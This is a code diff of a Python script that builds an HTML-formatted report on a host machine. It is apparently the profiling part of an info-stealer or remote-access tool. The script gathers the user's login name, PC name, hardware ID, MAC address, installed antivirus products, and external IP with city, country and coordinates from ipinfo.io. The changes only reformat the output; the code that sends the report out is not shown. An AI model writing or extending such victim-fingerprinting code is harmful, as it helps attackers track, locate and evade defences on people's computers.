@@ -155,17 +155,17 @@ drive space used: {get_size(mount.used)}
         ip_data = json.loads(requests.get('https://ipinfo.io/json').text)
         external_ip = ip_data['ip']
         if 'city' in ip_data:
-            city = f"🏙City: {ip_data['city']}\n"
+            city = f"🏙City: <code>{ip_data['city']}</code>\n"
         if 'region' in ip_data:
             region = f"Region: {ip_data['region']}\n"
         if 'country' in ip_data:
-            country = f"🗺Country: {ip_data['country']}\n"
+            country = f"🗺Country: <code>{ip_data['country']}</code>\n"
         if 'loc' in ip_data:
-            loc = f"Coordinates: {ip_data['loc']}\n"
+            loc = f"📍Coordinates: <code>{ip_data['loc']}</code>\n"
         if 'org' in ip_data:
             org = f"Organization: {ip_data['org']}\n"
         if 'timezone' in ip_data:
-            timezone = f"⌚Timezone: {ip_data['timezone']}\n"
+            timezone = f"⌚Timezone: <code>{ip_data['timezone']}</code>\n"
         if 'postal' in ip_data:
             postal = f"Postal: {ip_data['postal']}\n"
 
@@ -179,8 +179,8 @@ Internal IP: {internal_ip}
 {loc}{org}{postal}
 """
     ip_info_msg = f"""
-External IP: {external_ip}
-Internal IP: {internal_ip}
+🌐External IP: <code>{external_ip}</code>
+🌐Internal IP: <code>{internal_ip}</code>
 {loc}"""
     info =""
 
@@ -250,19 +250,19 @@ Antiviruses: {', '.join(Antiviruses)}
     
     msgdata=f"""
 <b>🖥System🖥</b>
-⏲Time: {time.asctime()}
-{timezone}{city}{country}👤Username: {os.getlogin()}
-👤PC Name: {uname.node}
-🖥OS: {uname.system} {uname.release}
-📋HWID: {hwid}
-📋MAC Address: {get_mac_address()} 
+⏲Time: <code>{time.asctime()}</code>
+{timezone}{city}{country}👤Username: <code>{os.getlogin()}</code>
+👤PC Name: <code>{uname.node}</code>
+🖥OS: <code>{uname.system} {uname.release}</code>
+📋HWID: <code>{hwid}</code>
+📋MAC Address: <code>{get_mac_address()}</code> 
 
 
 <b>🖥Hardware🖥</b>
-🔧CPU: {cpu}
-🔧RAM: {get_size(svmem.total)}
-🔧GPU: {', '.join(list_gpus)}
-🛡Antiviruses: {', '.join(Antiviruses)}
+🔧CPU: <code>{cpu}</code>
+🔧RAM: <code>{get_size(svmem.total)}</code>
+🔧GPU: <code>{', '.join(list_gpus)}</code>
+🛡Antiviruses: <code>{', '.join(Antiviruses)}</code>
 
 
 <b>📡Network📡</b>{ip_info_msg}
